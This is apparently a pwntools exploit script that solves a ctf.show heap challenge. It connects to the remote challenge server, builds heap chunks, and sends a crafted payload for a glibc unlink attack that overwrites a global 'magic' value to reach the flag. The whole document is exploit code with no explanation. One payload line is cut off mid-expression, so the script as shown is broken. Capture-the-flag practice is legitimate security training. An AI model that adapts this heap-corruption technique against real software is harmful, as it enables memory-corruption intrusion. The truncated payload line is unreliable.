from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28227)
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
heaparray_0 = 0x6020c0
heaparray_1 = 0x6020c8
heaparray_2 = 0x6020d0
heaparray_3 = 0x6020d8
def create_heap(size,content):
            io.recvuntil("choice :")
            io.sendline("1")
            io.recvuntil(":")
            io.sendline(str(size))
            io.recvuntil(":")
            io.sendline(content)
def edit_heap(idx,size,content):
            io.recvuntil("choice :")
            io.sendline("2")
            io.recvuntil(":")
            io.sendline(str(idx))
            io.recvuntil(":")
            io.sendline(str(size))
            io.recvuntil(":")
            io.sendline(content)
def delete_heap(idx):
            io.recvuntil("choice :")
            io.sendline("3")
            io.recvuntil(":")
            io.sendline(str(idx))
def get_flag():
            io.recvuntil("Your choice :")
            io.sendline('114514')
create_heap(0x88,'aaaa')
create_heap(0x88,'bbbbb')
create_heap(0x88,'ccccc')
create_heap(0x88,'ddddd')
create_heap(0x88,'eeeee')
#unlink
fd = heaparray_3 - 0x18
bk = heaparray_3 - 0x10
magic = 0x6020a0
payload = b'\x00'*8 + p64(0x81) + p64(fd) + p64(bk) + b'a'*0x60 + p64(0x80) + p6
edit_heap(3,0x90,payload)                                               
#gdb.attach(io)
delete_heap(4)                                                              
edit_heap(3,8,p64(magic))
edit_heap(0,8,p64(114515))
get_flag()
io.interactive()
